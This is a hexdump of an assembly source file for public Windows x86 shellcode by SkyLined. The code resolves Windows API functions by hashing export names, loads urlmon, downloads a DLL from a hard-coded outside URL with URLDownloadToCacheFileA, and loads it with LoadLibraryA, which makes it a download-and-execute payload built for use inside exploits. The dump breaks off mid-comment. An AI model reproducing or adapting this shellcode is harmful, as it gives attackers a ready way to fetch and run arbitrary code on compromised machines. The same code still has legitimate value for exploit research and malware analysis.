00000000  3b 20 43 6f 70 79 72 69  67 68 74 20 28 63 29 20  |; Copyright (c) |
00000010  32 30 30 39 2d 32 30 31  30 2c 20 42 65 72 65 6e  |2009-2010, Beren|
00000020  64 2d 4a 61 6e 20 22 53  6b 79 4c 69 6e 65 64 22  |d-Jan "SkyLined"|
00000030  20 57 65 76 65 72 20 3c  62 65 72 65 6e 64 6a 61  | Wever <berendja|
00000040  6e 77 65 76 65 72 40 67  6d 61 69 6c 2e 63 6f 6d  |nwever@gmail.com|
00000050  3e 0d 0a 3b 20 50 72 6f  6a 65 63 74 20 68 6f 6d  |>..; Project hom|
00000060  65 70 61 67 65 3a 20 68  74 74 70 3a 2f 2f 63 6f  |epage: http://co|
00000070  64 65 2e 67 6f 6f 67 6c  65 2e 63 6f 6d 2f 70 2f  |de.google.com/p/|
00000080  77 33 32 2d 64 6c 2d 6c  6f 61 64 6c 69 62 2d 73  |w32-dl-loadlib-s|
00000090  68 65 6c 6c 63 6f 64 65  2f 0d 0a 3b 20 41 6c 6c  |hellcode/..; All|
000000a0  20 72 69 67 68 74 73 20  72 65 73 65 72 76 65 64  | rights reserved|
000000b0  2e 20 53 65 65 20 43 4f  50 59 52 49 47 48 54 2e  |. See COPYRIGHT.|
000000c0  74 78 74 20 66 6f 72 20  64 65 74 61 69 6c 73 2e  |txt for details.|
000000d0  0d 0a 42 49 54 53 20 33  32 0d 0a 3b 20 57 69 6e  |..BITS 32..; Win|
000000e0  64 6f 77 73 20 78 38 36  20 6e 75 6c 6c 2d 66 72  |dows x86 null-fr|
000000f0  65 65 20 73 68 65 6c 6c  63 6f 64 65 20 74 68 61  |ee shellcode tha|
00000100  74 20 77 72 69 74 65 73  20 22 48 65 6c 6c 6f 2c  |t writes "Hello,|
00000110  20 77 6f 72 6c 64 21 22  20 74 6f 20 73 74 64 6f  | world!" to stdo|
00000120  75 74 2e 0d 0a 3b 20 57  6f 72 6b 73 20 69 6e 20  |ut...; Works in |
00000130  61 6e 79 20 63 6f 6e 73  6f 6c 65 20 61 70 70 6c  |any console appl|
00000140  69 63 61 74 69 6f 6e 20  66 6f 72 20 57 69 6e 64  |ication for Wind|
00000150  6f 77 73 20 35 2e 30 2d  37 2e 30 20 61 6c 6c 20  |ows 5.0-7.0 all |
00000160  73 65 72 76 69 63 65 20  70 61 63 6b 73 2e 0d 0a  |service packs...|
00000170  3b 20 28 53 65 65 20 68  74 74 70 3a 2f 2f 73 6b  |; (See http://sk|
00000180  79 70 68 65 72 2e 63 6f  6d 2f 77 69 6b 69 2f 69  |ypher.com/wiki/i|
00000190  6e 64 65 78 2e 70 68 70  2f 48 61 63 6b 69 6e 67  |ndex.php/Hacking|
000001a0  2f 53 68 65 6c 6c 63 6f  64 65 29 2e 0d 0a 3b 20  |/Shellcode)...; |
000001b0  54 68 69 73 20 76 65 72  73 69 6f 6e 20 75 73 65  |This version use|
000001c0  73 20 31 36 2d 62 69 74  20 68 61 73 68 65 73 2e  |s 16-bit hashes.|
000001d0  0d 0a 0d 0a 25 64 65 66  69 6e 65 20 75 72 6c 20  |....%define url |
000001e0  27 68 74 74 70 3a 2f 2f  73 6b 79 70 68 65 72 2e  |'http://skypher.|
000001f0  63 6f 6d 2f 64 6c 6c 27  0d 0a 25 73 74 72 6c 65  |com/dll'..%strle|
00000200  6e 20 73 69 7a 65 6f 66  5f 75 72 6c 20 75 72 6c  |n sizeof_url url|
00000210  0d 0a 0d 0a 25 69 6e 63  6c 75 64 65 20 27 77 33  |....%include 'w3|
00000220  32 2d 64 6c 2d 6c 6f 61  64 6c 69 62 2d 73 68 65  |2-dl-loadlib-she|
00000230  6c 6c 63 6f 64 65 2d 68  61 73 68 2d 6c 69 73 74  |llcode-hash-list|
00000240  2e 61 73 6d 27 0d 0a 0d  0a 25 64 65 66 69 6e 65  |.asm'....%define|
00000250  20 42 32 57 28 62 31 2c  62 32 29 20 20 20 20 20  | B2W(b1,b2)     |
00000260  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
00000270  20 28 28 28 62 32 29 20  3c 3c 20 38 29 20 2b 20  | (((b2) << 8) + |
00000280  28 62 31 29 29 0d 0a 25  64 65 66 69 6e 65 20 57  |(b1))..%define W|
00000290  32 44 57 28 77 31 2c 77  32 29 20 20 20 20 20 20  |2DW(w1,w2)      |
000002a0  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 28  |               (|
000002b0  28 28 77 32 29 20 3c 3c  20 31 36 29 20 2b 20 28  |((w2) << 16) + (|
000002c0  77 31 29 29 0d 0a 25 64  65 66 69 6e 65 20 42 32  |w1))..%define B2|
000002d0  44 57 28 62 31 2c 62 32  2c 62 33 2c 62 34 29 20  |DW(b1,b2,b3,b4) |
000002e0  20 20 20 20 20 20 20 20  20 20 20 20 20 20 28 28  |              ((|
000002f0  28 62 34 29 20 3c 3c 20  32 34 29 20 2b 20 28 28  |(b4) << 24) + ((|
00000300  62 33 29 20 3c 3c 20 31  36 29 20 2b 20 28 28 62  |b3) << 16) + ((b|
00000310  32 29 20 3c 3c 20 38 29  20 2b 20 28 62 31 29 29  |2) << 8) + (b1))|
00000320  0d 0a 0d 0a 25 64 65 66  69 6e 65 20 62 75 66 66  |....%define buff|
00000330  65 72 5f 73 69 7a 65 20  30 78 37 43 0d 0a 0d 0a  |er_size 0x7C....|
00000340  25 69 66 64 65 66 20 53  54 41 43 4b 5f 41 4c 49  |%ifdef STACK_ALI|
00000350  47 4e 0d 0a 20 20 20 20  41 4e 44 20 20 20 20 20  |GN..    AND     |
00000360  53 50 2c 20 30 78 46 46  46 43 0d 0a 25 65 6e 64  |SP, 0xFFFC..%end|
00000370  69 66 0d 0a 20 20 20 20  4d 4f 56 20 20 20 20 20  |if..    MOV     |
00000380  45 44 49 2c 20 57 32 44  57 28 68 61 73 68 5f 6b  |EDI, W2DW(hash_k|
00000390  65 72 6e 65 6c 33 32 5f  4c 6f 61 64 4c 69 62 72  |ernel32_LoadLibr|
000003a0  61 72 79 41 2c 20 68 61  73 68 5f 75 72 6c 6d 6f  |aryA, hash_urlmo|
000003b0  6e 5f 55 52 4c 44 6f 77  6e 6c 6f 61 64 54 6f 43  |n_URLDownloadToC|
000003c0  61 63 68 65 46 69 6c 65  41 29 0d 0a 66 69 6e 64  |acheFileA)..find|
000003d0  5f 68 61 73 68 3a 20 3b  20 46 69 6e 64 20 6e 74  |_hash: ; Find nt|
000003e0  64 6c 6c 27 73 20 49 6e  49 6e 69 74 4f 72 64 65  |dll's InInitOrde|
000003f0  72 20 6c 69 73 74 20 6f  66 20 6d 6f 64 75 6c 65  |r list of module|
00000400  73 3a 0d 0a 20 20 20 20  50 55 53 48 20 20 20 20  |s:..    PUSH    |
00000410  45 44 49 20 20 20 20 20  20 20 20 20 20 20 20 20  |EDI             |
00000420  20 20 20 20 20 20 20 20  20 20 20 20 3b 20 53 74  |            ; St|
00000430  61 63 6b 20 3d 20 28 68  61 73 68 2c 20 68 61 73  |ack = (hash, has|
00000440  68 29 20 5b 2c 20 26 28  75 72 6c 29 2c 20 26 28  |h) [, &(url), &(|
00000450  4c 6f 61 64 4c 69 62 72  61 72 79 41 29 5d 0d 0a  |LoadLibraryA)]..|
00000460  20 20 20 20 58 4f 52 20  20 20 20 20 45 53 49 2c  |    XOR     ESI,|
00000470  20 45 53 49 20 20 20 20  20 20 20 20 20 20 20 20  | ESI            |
00000480  20 20 20 20 20 20 20 20  3b 20 45 53 49 20 3d 20  |        ; ESI = |
00000490  30 0d 0a 20 20 20 20 4d  4f 56 20 20 20 20 20 45  |0..    MOV     E|
000004a0  53 49 2c 20 5b 46 53 3a  45 53 49 20 2b 20 30 78  |SI, [FS:ESI + 0x|
000004b0  33 30 5d 20 20 20 20 20  20 20 20 3b 20 45 53 49  |30]        ; ESI|
000004c0  20 3d 20 26 28 50 45 42  29 20 28 5b 46 53 3a 30  | = &(PEB) ([FS:0|
000004d0  78 33 30 5d 29 0d 0a 20  20 20 20 4d 4f 56 20 20  |x30])..    MOV  |
000004e0  20 20 20 45 53 49 2c 20  5b 45 53 49 20 2b 20 30  |   ESI, [ESI + 0|
000004f0  78 30 43 5d 20 20 20 20  20 20 20 20 20 20 20 3b  |x0C]           ;|
00000500  20 45 53 49 20 3d 20 50  45 42 2d 3e 4c 64 72 0d  | ESI = PEB->Ldr.|
00000510  0a 20 20 20 20 4d 4f 56  20 20 20 20 20 45 53 49  |.    MOV     ESI|
00000520  2c 20 5b 45 53 49 20 2b  20 30 78 31 43 5d 20 20  |, [ESI + 0x1C]  |
00000530  20 20 20 20 20 20 20 20  20 3b 20 45 53 49 20 3d  |         ; ESI =|
00000540  20 50 45 42 2d 3e 4c 64  72 2e 49 6e 49 6e 69 74  | PEB->Ldr.InInit|
00000550  4f 72 64 65 72 20 28 66  69 72 73 74 20 6d 6f 64  |Order (first mod|
00000560  75 6c 65 29 0d 0a 6e 65  78 74 5f 6d 6f 64 75 6c  |ule)..next_modul|
00000570  65 3a 20 3b 20 47 65 74  20 74 68 65 20 62 61 73  |e: ; Get the bas|
00000580  65 61 64 64 72 65 73 73  20 6f 66 20 74 68 65 20  |eaddress of the |
00000590  63 75 72 72 65 6e 74 20  6d 6f 64 75 6c 65 20 61  |current module a|
000005a0  6e 64 20 66 69 6e 64 20  74 68 65 20 6e 65 78 74  |nd find the next|
000005b0  20 6d 6f 64 75 6c 65 3a  0d 0a 20 20 20 20 4d 4f  | module:..    MO|
000005c0  56 20 20 20 20 20 45 42  50 2c 20 5b 45 53 49 20  |V     EBP, [ESI |
000005d0  2b 20 30 78 30 38 5d 20  20 20 20 20 20 20 20 20  |+ 0x08]         |
000005e0  20 20 3b 20 45 42 50 20  3d 20 49 6e 49 6e 69 74  |  ; EBP = InInit|
000005f0  4f 72 64 65 72 5b 58 5d  2e 62 61 73 65 5f 61 64  |Order[X].base_ad|
00000600  64 72 65 73 73 0d 0a 20  20 20 20 4d 4f 56 20 20  |dress..    MOV  |
00000610  20 20 20 45 53 49 2c 20  5b 45 53 49 5d 20 20 20  |   ESI, [ESI]   |
00000620  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 3b  |               ;|
00000630  20 45 53 49 20 3d 20 49  6e 49 6e 69 74 4f 72 64  | ESI = InInitOrd|
00000640  65 72 5b 58 5d 2e 66 6c  69 6e 6b 20 3d 3d 20 49  |er[X].flink == I|
00000650  6e 49 6e 69 74 4f 72 64  65 72 5b 58 2b 31 5d 0d  |nInitOrder[X+1].|
00000660  0a 67 65 74 5f 70 72 6f  63 5f 61 64 64 72 65 73  |.get_proc_addres|
00000670  73 5f 6c 6f 6f 70 3a 20  3b 20 46 69 6e 64 20 74  |s_loop: ; Find t|
00000680  68 65 20 50 45 20 68 65  61 64 65 72 20 61 6e 64  |he PE header and|
00000690  20 65 78 70 6f 72 74 20  61 6e 64 20 6e 61 6d 65  | export and name|
000006a0  73 20 74 61 62 6c 65 73  20 6f 66 20 74 68 65 20  |s tables of the |
000006b0  6d 6f 64 75 6c 65 3a 0d  0a 20 20 20 20 4d 4f 56  |module:..    MOV|
000006c0  20 20 20 20 20 45 42 58  2c 20 5b 45 42 50 20 2b  |     EBX, [EBP +|
000006d0  20 30 78 33 43 5d 20 20  20 20 20 20 20 20 20 20  | 0x3C]          |
000006e0  20 3b 20 45 42 58 20 3d  20 26 28 50 45 20 68 65  | ; EBX = &(PE he|
000006f0  61 64 65 72 29 0d 0a 20  20 20 20 4d 4f 56 20 20  |ader)..    MOV  |
00000700  20 20 20 45 42 58 2c 20  5b 45 42 50 20 2b 20 45  |   EBX, [EBP + E|
00000710  42 58 20 2b 20 30 78 37  38 5d 20 20 20 20 20 3b  |BX + 0x78]     ;|
00000720  20 45 42 58 20 3d 20 6f  66 66 73 65 74 28 65 78  | EBX = offset(ex|
00000730  70 6f 72 74 20 74 61 62  6c 65 29 0d 0a 20 20 20  |port table)..   |
00000740  20 41 44 44 20 20 20 20  20 45 42 58 2c 20 45 42  | ADD     EBX, EB|
00000750  50 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |P               |
00000760  20 20 20 20 20 3b 20 45  42 58 20 3d 20 26 28 65  |     ; EBX = &(e|
00000770  78 70 6f 72 74 20 74 61  62 6c 65 29 0d 0a 20 20  |xport table)..  |
00000780  20 20 4d 4f 56 20 20 20  20 20 45 43 58 2c 20 5b  |  MOV     ECX, [|
00000790  45 42 58 20 2b 20 30 78  31 38 5d 20 20 20 20 20  |EBX + 0x18]     |
000007a0  20 20 20 20 20 20 3b 20  45 43 58 20 3d 20 6e 75  |      ; ECX = nu|
000007b0  6d 62 65 72 20 6f 66 20  6e 61 6d 65 20 70 6f 69  |mber of name poi|
000007c0  6e 74 65 72 73 0d 0a 20  20 20 20 4a 43 58 5a 20  |nters..    JCXZ |
000007d0  20 20 20 6e 65 78 74 5f  6d 6f 64 75 6c 65 20 20  |   next_module  |
000007e0  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 3b  |               ;|
000007f0  20 4e 6f 20 6e 61 6d 65  20 70 6f 69 6e 74 65 72  | No name pointer|
00000800  73 3f 20 4e 65 78 74 20  6d 6f 64 75 6c 65 2e 0d  |s? Next module..|
00000810  0a 6e 65 78 74 5f 66 75  6e 63 74 69 6f 6e 5f 6c  |.next_function_l|
00000820  6f 6f 70 3a 20 3b 20 47  65 74 20 74 68 65 20 6e  |oop: ; Get the n|
00000830  65 78 74 20 66 75 6e 63  74 69 6f 6e 20 6e 61 6d  |ext function nam|
00000840  65 20 66 6f 72 20 68 61  73 68 69 6e 67 3a 0d 0a  |e for hashing:..|
00000850  20 20 20 20 4d 4f 56 20  20 20 20 20 45 44 49 2c  |    MOV     EDI,|
00000860  20 5b 45 42 58 20 2b 20  30 78 32 30 5d 20 20 20  | [EBX + 0x20]   |
00000870  20 20 20 20 20 20 20 20  3b 20 45 44 49 20 3d 20  |        ; EDI = |
00000880  6f 66 66 73 65 74 28 6e  61 6d 65 73 20 74 61 62  |offset(names tab|
00000890  6c 65 29 0d 0a 20 20 20  20 41 44 44 20 20 20 20  |le)..    ADD    |
000008a0  20 45 44 49 2c 20 45 42  50 20 20 20 20 20 20 20  | EDI, EBP       |
000008b0  20 20 20 20 20 20 20 20  20 20 20 20 20 3b 20 45  |             ; E|
000008c0  44 49 20 3d 20 26 28 6e  61 6d 65 73 20 74 61 62  |DI = &(names tab|
000008d0  6c 65 29 0d 0a 20 20 20  20 4d 4f 56 20 20 20 20  |le)..    MOV    |
000008e0  20 45 44 49 2c 20 5b 45  44 49 20 2b 20 45 43 58  | EDI, [EDI + ECX|
000008f0  20 2a 20 34 20 2d 20 34  5d 20 20 20 20 3b 20 45  | * 4 - 4]    ; E|
00000900  44 49 20 3d 20 6f 66 66  73 65 74 28 66 75 6e 63  |DI = offset(func|
00000910  74 69 6f 6e 20 6e 61 6d  65 29 0d 0a 20 20 20 20  |tion name)..    |
00000920  41 44 44 20 20 20 20 20  45 44 49 2c 20 45 42 50  |ADD     EDI, EBP|
00000930  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
00000940  20 20 20 20 3b 20 45 44  49 20 3d 20 26 28 66 75  |    ; EDI = &(fu|
00000950  6e 63 74 69 6f 6e 20 6e  61 6d 65 29 0d 0a 20 20  |nction name)..  |
00000960  20 20 58 4f 52 20 20 20  20 20 45 41 58 2c 20 45  |  XOR     EAX, E|
00000970  41 58 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |AX              |
00000980  20 20 20 20 20 20 3b 20  45 41 58 20 3d 20 30 0d  |      ; EAX = 0.|
00000990  0a 20 20 20 20 43 44 51  20 20 20 20 20 20 20 20  |.    CDQ        |
000009a0  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
000009b0  20 20 20 20 20 20 20 20  20 3b 20 45 44 58 20 3d  |         ; EDX =|
000009c0  20 30 0d 0a 68 61 73 68  5f 6c 6f 6f 70 3a 20 3b  | 0..hash_loop: ;|
000009d0  20 48 61 73 68 20 74 68  65 20 66 75 6e 63 74 69  | Hash the functi|
000009e0  6f 6e 20 6e 61 6d 65 20  61 6e 64 20 63 6f 6d 70  |on name and comp|
000009f0  61 72 65 20 77 69 74 68  20 72 65 71 75 65 73 74  |are with request|
00000a00  65 64 20 68 61 73 68 0d  0a 20 20 20 20 58 4f 52  |ed hash..    XOR|
00000a10  20 20 20 20 20 44 4c 2c  20 5b 45 44 49 5d 0d 0a  |     DL, [EDI]..|
00000a20  20 20 20 20 52 4f 52 20  20 20 20 20 44 58 2c 20  |    ROR     DX, |
00000a30  42 59 54 45 20 68 61 73  68 5f 72 6f 72 5f 76 61  |BYTE hash_ror_va|
00000a40  6c 75 65 0d 0a 20 20 20  20 53 43 41 53 42 0d 0a  |lue..    SCASB..|
00000a50  20 20 20 20 4a 4e 45 20  20 20 20 20 68 61 73 68  |    JNE     hash|
00000a60  5f 6c 6f 6f 70 0d 0a 20  20 20 20 43 4d 50 20 20  |_loop..    CMP  |
00000a70  20 20 20 44 58 2c 20 5b  45 53 50 5d 0d 0a 20 20  |   DX, [ESP]..  |
00000a80  20 20 4c 4f 4f 50 4e 45  20 20 6e 65 78 74 5f 66  |  LOOPNE  next_f|
00000a90  75 6e 63 74 69 6f 6e 5f  6c 6f 6f 70 20 20 20 20  |unction_loop    |
00000aa0  20 20 20 20 20 20 3b 20  4e 6f 74 20 74 68 65 20  |      ; Not the |
00000ab0  72 69 67 68 74 20 68 61  73 68 20 61 6e 64 20 66  |right hash and f|
00000ac0  75 6e 63 74 69 6f 6e 73  20 6c 65 66 74 20 69 6e  |unctions left in|
00000ad0  20 6d 6f 64 75 6c 65 3f  20 4e 65 78 74 20 66 75  | module? Next fu|
00000ae0  6e 63 74 69 6f 6e 0d 0a  20 20 20 20 4a 4e 45 20  |nction..    JNE |
00000af0  20 20 20 20 6e 65 78 74  5f 6d 6f 64 75 6c 65 20  |    next_module |
00000b00  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
00000b10  3b 20 4e 6f 74 20 74 68  65 20 72 69 67 68 74 20  |; Not the right |
00000b20  68 61 73 68 20 61 6e 64  20 6e 6f 20 66 75 6e 63  |hash and no func|
00000b30  74 69 6f 6e 73 20 6c 65  66 74 20 69 6e 20 6d 6f  |tions left in mo|
00000b40  64 75 6c 65 3f 20 4e 65  78 74 20 6d 6f 64 75 6c  |dule? Next modul|
00000b50  65 0d 0a 20 20 20 20 3b  20 46 6f 75 6e 64 20 74  |e..    ; Found t|
00000b60  68 65 20 72 69 67 68 74  20 68 61 73 68 3a 20 67  |he right hash: g|
00000b70  65 74 20 74 68 65 20 61  64 64 72 65 73 73 20 6f  |et the address o|
00000b80  66 20 74 68 65 20 66 75  6e 63 74 69 6f 6e 3a 0d  |f the function:.|
00000b90  0a 20 20 20 20 4d 4f 56  20 20 20 20 20 45 44 58  |.    MOV     EDX|
00000ba0  2c 20 5b 45 42 58 20 2b  20 30 78 32 34 5d 20 20  |, [EBX + 0x24]  |
00000bb0  20 20 20 20 20 20 20 20  20 3b 20 45 53 49 20 3d  |         ; ESI =|
00000bc0  20 6f 66 66 73 65 74 20  6f 72 64 69 6e 61 6c 73  | offset ordinals|
00000bd0  20 74 61 62 6c 65 0d 0a  20 20 20 20 41 44 44 20  | table..    ADD |
00000be0  20 20 20 20 45 44 58 2c  20 45 42 50 20 20 20 20  |    EDX, EBP    |
00000bf0  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
00000c00  3b 20 45 53 49 20 3d 20  26 6f 72 69 64 69 6e 61  |; ESI = &oridina|
00000c10  6c 73 20 74 61 62 6c 65  0d 0a 20 20 20 20 4d 4f  |ls table..    MO|
00000c20  56 5a 58 20 20 20 45 44  58 2c 20 57 4f 52 44 20  |VZX   EDX, WORD |
00000c30  5b 45 44 58 20 2b 20 32  20 2a 20 45 43 58 5d 20  |[EDX + 2 * ECX] |
00000c40  20 20 3b 20 45 53 49 20  3d 20 6f 72 64 69 6e 61  |  ; ESI = ordina|
00000c50  6c 20 6e 75 6d 62 65 72  20 6f 66 20 66 75 6e 63  |l number of func|
00000c60  74 69 6f 6e 0d 0a 20 20  20 20 4d 4f 56 20 20 20  |tion..    MOV   |
00000c70  20 20 45 44 49 2c 20 5b  45 42 58 20 2b 20 30 78  |  EDI, [EBX + 0x|
00000c80  31 43 5d 20 20 20 20 20  20 20 20 20 20 20 3b 20  |1C]           ; |
00000c90  45 44 49 20 3d 20 6f 66  66 73 65 74 20 61 64 64  |EDI = offset add|
00000ca0  72 65 73 73 20 74 61 62  6c 65 0d 0a 20 20 20 20  |ress table..    |
00000cb0  41 44 44 20 20 20 20 20  45 44 49 2c 20 45 42 50  |ADD     EDI, EBP|
00000cc0  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
00000cd0  20 20 20 20 3b 20 45 44  49 20 3d 20 26 61 64 64  |    ; EDI = &add|
00000ce0  72 65 73 73 20 74 61 62  6c 65 0d 0a 20 20 20 20  |ress table..    |
00000cf0  41 44 44 20 20 20 20 20  45 42 50 2c 20 5b 45 44  |ADD     EBP, [ED|
00000d00  49 20 2b 20 34 20 2a 20  45 44 58 5d 20 20 20 20  |I + 4 * EDX]    |
00000d10  20 20 20 20 3b 20 45 42  50 20 3d 20 26 28 66 75  |    ; EBP = &(fu|
00000d20  6e 63 74 69 6f 6e 29 0d  0a 20 20 20 20 3b 20 4d  |nction)..    ; M|
00000d30  6f 76 65 20 74 6f 20 74  68 65 20 6e 65 78 74 20  |ove to the next |
00000d40  68 61 73 68 2c 20 74 68  69 73 20 73 65 74 73 20  |hash, this sets |
00000d50  45 43 58 20 74 6f 20 30  20 69 66 20 74 68 65 72  |ECX to 0 if ther|
00000d60  65 20 61 72 65 20 6e 6f  20 6d 6f 72 65 20 68 61  |e are no more ha|
00000d70  73 68 65 73 3a 0d 0a 20  20 20 20 50 4f 50 20 20  |shes:..    POP  |
00000d80  20 20 20 43 58 20 20 20  20 20 20 20 20 20 20 20  |   CX           |
00000d90  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 3b  |               ;|
00000da0  20 43 58 20 3d 20 68 61  73 68 20 7c 20 53 74 61  | CX = hash | Sta|
00000db0  63 6b 20 3d 20 68 61 73  68 20 5b 2c 20 26 28 75  |ck = hash [, &(u|
00000dc0  72 6c 29 2c 20 26 28 4c  6f 61 64 4c 69 62 72 61  |rl), &(LoadLibra|
00000dd0  72 79 41 29 5d 0d 0a 20  20 20 20 50 4f 50 20 20  |ryA)]..    POP  |
00000de0  20 20 20 43 58 20 20 20  20 20 20 20 20 20 20 20  |   CX           |
00000df0  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 3b  |               ;|
00000e00  20 43 58 20 3d 20 68 61  73 68 20 7c 20 53 74 61  | CX = hash | Sta|
00000e10  63 6b 20 3d 20 5b 26 28  75 72 6c 29 2c 20 26 28  |ck = [&(url), &(|
00000e20  4c 6f 61 64 4c 69 62 72  61 72 79 41 29 5d 0d 0a  |LoadLibraryA)]..|
00000e30  20 20 20 20 4d 4f 56 20  20 20 20 20 41 48 2c 20  |    MOV     AH, |
00000e40  30 78 31 20 20 20 20 20  20 20 20 20 20 20 20 20  |0x1             |
00000e50  20 20 20 20 20 20 20 20  3b 20 45 41 58 20 3d 20  |        ; EAX = |
00000e60  30 78 31 30 30 0d 0a 20  20 20 20 4a 43 58 5a 20  |0x100..    JCXZ |
00000e70  20 20 20 64 6f 77 6e 6c  6f 61 64 5f 61 6e 64 5f  |   download_and_|
00000e80  6c 6f 61 64 6c 69 62 72  61 72 79 20 20 20 20 3b  |loadlibrary    ;|
00000e90  20 4e 6f 20 6d 6f 72 65  20 68 61 73 68 65 73 0d  | No more hashes.|
00000ea0  0a 20 20 20 20 4d 4f 56  20 20 20 20 20 45 44 49  |.    MOV     EDI|
00000eb0  2c 20 45 43 58 20 20 20  20 20 20 20 20 20 20 20  |, ECX           |
00000ec0  20 20 20 20 20 20 20 20  20 3b 20 45 44 49 20 3d  |         ; EDI =|
00000ed0  20 68 61 73 68 65 73 0d  0a 20 20 20 20 53 55 42  | hashes..    SUB|
00000ee0  20 20 20 20 20 45 53 50  2c 20 45 41 58 20 20 20  |     ESP, EAX   |
00000ef0  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
00000f00  20 3b 20 53 74 61 63 6b  20 3d 20 62 75 66 66 65  | ; Stack = buffe|
00000f10  72 20 28 30 78 31 30 30  20 62 79 74 65 73 29 0d  |r (0x100 bytes).|
00000f20  0a 20 20 20 20 50 55 53  48 20 20 20 20 41 58 20  |.    PUSH    AX |
00000f30  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
00000f40  20 20 20 20 20 20 20 20  20 3b 20 53 74 61 63 6b  |         ; Stack|
00000f50  20 3d 20 28 30 2c 20 31  29 2c 20 62 75 66 66 65  | = (0, 1), buffe|
00000f60  72 0d 0a 20 20 20 20 50  55 53 48 20 20 20 20 42  |r..    PUSH    B|
00000f70  32 44 57 28 27 6c 27 2c  20 27 6d 27 2c 20 27 6f  |2DW('l', 'm', 'o|
00000f80  27 2c 20 27 6e 27 29 20  20 20 20 3b 20 53 74 61  |', 'n')    ; Sta|
00000f90  63 6b 20 3d 20 22 6c 6d  6f 6e 22 2c 20 28 30 2c  |ck = "lmon", (0,|
00000fa0  20 31 29 2c 20 62 75 66  66 65 72 0d 0a 20 20 20  | 1), buffer..   |
00000fb0  20 50 55 53 48 20 20 20  20 57 4f 52 44 20 42 32  | PUSH    WORD B2|
00000fc0  57 28 27 75 27 2c 20 27  72 27 29 20 20 20 20 20  |W('u', 'r')     |
00000fd0  20 20 20 20 20 3b 20 53  74 61 63 6b 20 3d 20 22  |     ; Stack = "|
00000fe0  75 72 6c 6d 6f 6e 22 2c  20 28 30 2c 20 31 29 2c  |urlmon", (0, 1),|
00000ff0  20 62 75 66 66 65 72 0d  0a 20 20 20 20 50 55 53  | buffer..    PUS|
00001000  48 20 20 20 20 45 53 50  20 20 20 20 20 20 20 20  |H    ESP        |
00001010  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
00001020  20 3b 20 53 74 61 63 6b  20 3d 20 26 28 22 75 72  | ; Stack = &("ur|
00001030  6c 6d 6f 6e 22 29 2c 20  22 75 72 6c 6d 6f 6e 22  |lmon"), "urlmon"|
00001040  2c 20 28 30 2c 20 31 29  2c 20 62 75 66 66 65 72  |, (0, 1), buffer|
00001050  0d 0a 20 20 20 20 43 41  4c 4c 20 20 20 20 45 42  |..    CALL    EB|
00001060  50 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |P               |
00001070  20 20 20 20 20 20 20 20  20 20 3b 20 4c 6f 61 64  |          ; Load|
00001080  4c 69 62 72 61 72 79 41  28 22 75 72 6c 6d 6f 6e  |LibraryA("urlmon|
00001090  22 29 0d 0a 20 20 20 20  50 55 53 48 20 20 20 20  |")..    PUSH    |
000010a0  45 42 50 20 20 20 20 20  20 20 20 20 20 20 20 20  |EBP             |
000010b0  20 20 20 20 20 20 20 20  20 20 20 20 3b 20 53 74  |            ; St|
000010c0  61 63 6b 20 3d 20 26 28  4c 6f 61 64 4c 69 62 72  |ack = &(LoadLibr|
000010d0  61 72 79 41 29 2c 20 62  75 66 66 65 72 0d 0a 20  |aryA), buffer.. |
000010e0  20 20 20 43 41 4c 4c 20  20 20 20 66 69 6e 64 5f  |   CALL    find_|
000010f0  68 61 73 68 20 20 20 20  20 20 20 20 20 20 20 20  |hash            |
00001100  20 20 20 20 20 20 20 3b  20 53 74 61 63 6b 20 3d  |       ; Stack =|
00001110  20 26 28 75 72 6c 29 2c  20 26 28 4c 6f 61 64 4c  | &(url), &(LoadL|
00001120  69 62 72 61 72 79 41 29  2c 20 62 75 66 66 65 72  |ibraryA), buffer|
00001130  0d 0a 20 20 20 20 64 62  20 20 20 20 20 20 75 72  |..    db      ur|
00001140  6c 0d 0a 64 6f 77 6e 6c  6f 61 64 5f 61 6e 64 5f  |l..download_and_|
00001150  6c 6f 61 64 6c 69 62 72  61 72 79 3a 20 20 20 20  |loadlibrary:    |
00001160  20 20 20 20 20 20 20 20  20 20 20 3b 20 53 74 61  |           ; Sta|
00001170  63 6b 20 3d 20 26 28 75  72 6c 29 2c 20 26 28 4c  |ck = &(url), &(L|
00001180  6f 61 64 4c 69 62 72 61  72 79 41 29 2c 20 62 75  |oadLibraryA), bu|
00001190  66 66 65 72 0d 0a 20 20  20 20 50 4f 50 20 20 20  |ffer..    POP   |
000011a0  20 20 45 53 49 20 20 20  20 20 20 20 20 20 20 20  |  ESI           |
000011b0  20 20 20 20 20 20 20 20  20 20 20 20 20 20 3b 20  |              ; |
000011c0  45 53 49 20 3d 20 26 28  75 72 6c 29 20 20 20 20  |ESI = &(url)    |
000011d0  20 20 20 20 20 20 7c 20  53 74 61 63 6b 20 3d 20  |      | Stack = |
000011e0  26 28 4c 6f 61 64 4c 69  62 72 61 72 79 41 29 2c  |&(LoadLibraryA),|
000011f0  20 62 75 66 66 65 72 0d  0a 20 20 20 20 50 4f 50  | buffer..    POP|
00001200  20 20 20 20 20 45 44 58  20 20 20 20 20 20 20 20  |     EDX        |
00001210  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
00001220  20 3b 20 45 44 58 20 3d  20 26 28 4c 6f 61 64 4c  | ; EDX = &(LoadL|
00001230  69 62 72 61 72 79 41 29  20 7c 20 53 74 61 63 6b  |ibraryA) | Stack|
00001240  20 3d 20 62 75 66 66 65  72 0d 0a 20 20 20 20 3b  | = buffer..    ;|
00001250  20 43 6f 70 79 20 75 72  6c 20 74 6f 20 73 74 61  | Copy url to sta|
